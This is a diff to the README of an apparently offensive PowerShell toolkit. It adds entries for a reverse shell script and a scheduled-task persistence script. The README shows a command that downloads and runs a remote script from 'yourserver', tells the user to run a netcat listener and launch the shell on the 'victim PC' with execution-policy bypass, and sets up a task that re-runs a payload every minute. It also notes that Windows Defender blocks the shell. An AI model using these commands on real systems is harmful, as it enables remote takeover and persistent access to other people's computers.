@@ -20,6 +20,16 @@
 
 ``where base64 is: "iex(NEW-Object Net.WebClient).DownloadString('http://yourserver/remotepd.ps1')" ``
 
+**shell.ps1** - Simple PS shell from https://gist.github.com/ohpe/bdd9d4385f8e6df26c02448f1bcc7a25 
+
+ - Some Problem: Windows Defender block this shell script (30.10.19)
+
+``Example: run nc -lvp 443 on your PC and run powerhsell -exec bypass shell.ps1 on victim PC``
+
+**scheduler.ps1** - Add your PS script to Windows Scheduler. Sched start every 1 min
+
+``In scheduler.ps you must set path to script: $Action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-exec bypass c:\temp\_your_scrip.ps1'``
+
 
 # Wish #
 
